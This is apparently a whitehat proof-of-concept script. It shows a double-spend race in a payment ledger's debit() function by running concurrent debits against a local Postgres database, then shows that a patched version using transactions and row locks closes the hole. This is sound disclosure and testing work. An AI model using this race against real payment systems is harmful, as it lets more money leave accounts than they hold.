// ckb-whitehat PoC — Dular: F2 double-spend race in server/services/ledger.js
//
// ledger.js debit() does: SELECT balance (no lock) -> guard -> INSERT entry
// (idempotency on source id only) -> UPDATE balance = balance - amount.
// No transaction, no FOR UPDATE. Two concurrent debits both read the same
// balance, both pass the guard, both insert (different source ids), both
// subtract. The primitives to fix this (withTransaction / withAdvisoryLock)
// already exist in server/db.js but are not used by ledger.js.
//
// Three parts:
//   A. Deterministic interleaving of the EXACT SQL debit() issues, run by two
//      clients (this is the race the app's own concurrent debits hit).
//   B. Real-module corroboration: N parallel calls to the actual debit()
//      exported by the repo, real Postgres, pool clients, no transaction.
//   C. Fix proof: the same Part B run against a patched copy of ledger.js
//      (withTransaction + SELECT ... FOR UPDATE) — invariant now holds.
//
// All DB work targets our own local Postgres (postgres://dular@127.0.0.1:5433/dular).
// No network, no live service.

process.env.DATABASE_URL = 'postgres://dular@127.0.0.1:5433/dular'

const DULAR = (process.env.DULAR_DIR || '/tmp/ckb-whitehat/dular/server')

const line = (t) => console.log('\n=== ' + t + ' ===')

// ---------------------------------------------------------------- part A
async function partA() {
  line('F2-A — deterministic interleaving of debit() SQL (two clients, same funds)')
  const { default: pg } = await import('pg')
  const { pool } = await import(`${DULAR}/db.js`)

  const uid = '11111111-1111-1111-1111-111111111111'
  await pool.query('DELETE FROM ledger_entries WHERE user_id = $1', [uid])
  await pool.query('DELETE FROM ledger_accounts WHERE user_id = $1', [uid])
  await pool.query('INSERT INTO users (id, phone) VALUES ($1, $2) ON CONFLICT DO NOTHING', [uid, '+254700000002'])
  await pool.query('INSERT INTO ledger_accounts (user_id, balance_base_units) VALUES ($1, 1000)', [uid])

  // The exact two statements debit() runs, interleaved as two concurrent
  // transactions would: BOTH read, BOTH guard, BOTH insert, BOTH update.
  const c1 = await pool.connect()
  const c2 = await pool.connect()
  const readBalance = async (c) =>
    BigInt((await c.query('SELECT balance_base_units FROM ledger_accounts WHERE user_id = $1', [uid])).rows[0].balance_base_units)

  const [b1, b2] = await Promise.all([readBalance(c1), readBalance(c2)])
  console.log('both clients read balance =', b1.toString(), '(each passes guard: 1000 >= 600)')
  const ins = async (c, src) => c.query(
    `INSERT INTO ledger_entries (user_id, direction, amount_base_units, source_type, source_id)
     VALUES ($1, 'debit', 600, 'phone_payment', $2)
     ON CONFLICT (source_type, source_id, direction, user_id) DO NOTHING RETURNING id`,
    [uid, src],
  )
  const [i1, i2] = await Promise.all([ins(c1, 'race-a-1'), ins(c2, 'race-a-2')])
  console.log('entries inserted:', i1.rowCount, '+', i2.rowCount, '(both succeeded)')
  await Promise.all([
    c1.query('UPDATE ledger_accounts SET balance_base_units = balance_base_units - 600 WHERE user_id = $1', [uid]),
    c2.query('UPDATE ledger_accounts SET balance_base_units = balance_base_units - 600 WHERE user_id = $1', [uid]),
  ])
  const final = await readBalance(c1)
  console.log('final balance =', final.toString(), '(2 x 600 debits against 1000 of funds)')
  const invariant = i1.rowCount === 1 && i2.rowCount === 1 && final < 0n
  console.log(invariant
    ? 'INVARIANT VIOLATED: two payments succeeded, balance negative'
    : 'invariant held (race did not fire this run)')
  c1.release(); c2.release()
  return invariant
}

// ---------------------------------------------------------------- part B
// Each debit is called exactly the way the app's per-request handler calls
// ledger functions: on a fresh client, no shared state. We pass `pool`
// itself (it exposes .query) so no outer client is held and the pg pool
// (max 10) is never exhausted by 12 parallel calls.
async function partB(ledgerPath, label) {
  line(`F2-B — ${label}: 12 parallel real debit() calls, 600 each, balance 1000`)
  const { pool } = await import(`${DULAR}/db.js`)
  const ledger = await import(ledgerPath)

  const uid = '22222222-2222-2222-2222-222222222222'
  await pool.query('DELETE FROM ledger_entries WHERE user_id = $1', [uid])
  await pool.query('DELETE FROM ledger_accounts WHERE user_id = $1', [uid])
  await pool.query('INSERT INTO users (id, phone) VALUES ($1, $2) ON CONFLICT DO NOTHING', [uid, '+254700000003'])
  await pool.query('INSERT INTO ledger_accounts (user_id, balance_base_units) VALUES ($1, 1000)', [uid])

  let ok = 0, rejected = 0
  await Promise.all(Array.from({ length: 12 }, async (_, i) => {
    try {
      // Only one 600-debit can fit into 1000. A correct impl rejects 11.
      await ledger.debit(pool, {
        userId: uid, amount: 600n,
        sourceType: 'phone_payment', sourceId: `parallel-${i}`,
      })
      ok += 1
    } catch { rejected += 1 }
  }))

  const bal = BigInt((await pool.query('SELECT balance_base_units FROM ledger_accounts WHERE user_id = $1', [uid])).rows[0].balance_base_units)
  const sum = BigInt((await pool.query('SELECT COALESCE(SUM(amount_base_units), 0) AS sum FROM ledger_entries WHERE user_id = $1 AND direction = $2', [uid, 'debit'])).rows[0].sum)
  console.log(`successful debits: ${ok} (max that fits in 1000 = 1), rejected: ${rejected}`)
  console.log(`final balance: ${bal.toString()}   sum of posted debits: ${sum.toString()}   funds available: 1000`)
  const violated = ok > 1 || bal < 0n || sum > 1000n
  console.log(violated
    ? `INVARIANT VIOLATED: ${ok} debits posted, ${sum > 1000n ? sum + ' > 1000' : 'negative balance ' + bal} — more money went out than existed`
    : 'invariant held: only 1 debit fit, balance never negative')
  return violated
}

// ---------------------------------------------------------------- main
const main = async () => {
  const firedA = await partA()
  const firedB = await partB(`${DULAR}/services/ledger.js`, 'UNFIXED ledger.js')
  await import('pg')
  const { pool } = await import(`${DULAR}/db.js`)
  const fixedB = await partB((process.env.POC_DIR || new URL('./fixed-ledger.js', import.meta.url).pathname), 'FIXED ledger.js (withTransaction + FOR UPDATE)')
  await pool.end()

  console.log('\n=== F2 verdict ===')
  console.log(`deterministic interleave fired: ${firedA}`)
  console.log(`real-module parallel race violated invariant: ${firedB}`)
  console.log(`fixed version violated invariant: ${fixedB} (expected false)`)
  if (firedB && !fixedB) console.log('F2 CONFIRMED: ledger.js debit() is racy; the patched module closes it.')
  else if (!firedB) console.log('NOTE: parallel run did not fire this time (race is probabilistic); Part A is the deterministic proof. Re-run with more iterations if needed.')
  process.exit(firedA ? 0 : 1)
}
main()
